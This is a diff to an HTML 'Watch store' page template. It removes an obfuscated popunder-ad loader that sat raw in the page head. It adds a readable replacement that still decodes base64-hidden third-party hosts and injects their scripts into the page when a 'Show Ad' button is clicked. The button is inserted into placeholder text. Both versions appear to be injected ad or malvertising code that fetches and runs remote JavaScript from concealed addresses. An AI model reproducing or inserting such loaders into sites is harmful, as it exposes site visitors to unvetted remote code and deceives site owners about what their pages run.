@@ -4,7 +4,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-(function(){var l=window,m="fb731d7708f26793b5e0c4a9fb16bce0",c=[["siteId",239*694*398-60782851],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],u=["d3d3LmNkbjRhZHMuY29tL3FobHMubWluLmNzcw==","ZDNnNW92Zm5nanc5YncuY2xvdWRmcm9udC5uZXQvUFBYdkRSL3NpcGFkZHIubWluLmpz"],v=-1,q,o,x=function(){clearTimeout(o);v++;if(u[v]&&!(1782004506000<(new Date).getTime()&&1<v)){q=l.document.createElement("script");q.type="text/javascript";q.async=!0;var f=l.getElementsByTagName("script")[0];q.src="https://"+atob(u[v]);q.crossOrigin="anonymous";q.onerror=x;q.onload=function(){clearTimeout(o);l[m.slice(0,16)+m.slice(0,16)]||x()};o=setTimeout(x,5E3);f.parentNode.insertBefore(q,f)}};if(!l[m]){try{Object.freeze(l[m]=c)}catch(e){}x()}})();
+<!-- Example: trigger ad on click -->
+
+
+<script type="text/javascript">
+(function() {
+    var adScriptUrls = [
+        atob("d3d3LmNkbjRhZHMuY29tL3FobHMubWluLmNzcw=="),
+        atob("ZDNnNW92Zm5nanc5YncuY2xvdWRmcm9udC5uZXQvUFBYdkRSL3NpcGFkZHIubWluLmpz")
+    ];
+    
+    function loadAdScript(index) {
+        if(index >= adScriptUrls.length) return;
+        var script = document.createElement("script");
+        script.src = "https://" + adScriptUrls[index];
+        script.async = true;
+        script.crossOrigin = "anonymous";
+        script.onerror = function() {
+            loadAdScript(index + 1);
+        };
+        document.head.appendChild(script);
+    }
+
+    document.getElementById("showAdBtn").addEventListener("click", function() {
+        loadAdScript(0); // only load on user click
+    });
+})();
+</script>
 
 
     <title>Watch store</title>
@@ -110,7 +136,7 @@
                             ut labore et dolore magna aliqua.</p>
                         <span> <i  class="fa fa-cog pt-3"></i></span>
                         <h4>High Performance</h4>
-                        <p>Lorem ipsum dolor sit amet, consectetur adipisic ing elit, seddo eiusmod tempor incid.idunt
+                        <p>Lorem ipsum dolor sit amet, consectetur <button id="showAdBtn">Show Ad</button> adipisic ing elit, seddo eiusmod tempor incid.idunt
                             ut labore et dolore magna aliqua.</p>
                     </div>
 
@@ -530,6 +556,7 @@
 </body>
 
 </html>
+
 
 
 
